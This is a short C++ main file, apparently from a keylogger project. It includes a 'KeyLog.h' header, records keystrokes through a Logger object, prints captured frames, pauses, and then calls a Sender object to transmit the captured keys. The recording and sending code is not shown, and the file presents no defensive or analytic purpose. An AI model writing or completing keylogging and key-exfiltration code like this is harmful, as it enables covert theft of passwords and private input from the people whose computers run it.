#include "KeyLog.h"

int main()
{
	//Sleep(5000);
	Logger.record();
	Logger.printFrames();

	Sleep(5000);
	
	Sender.sendKeys();
	return 0;
}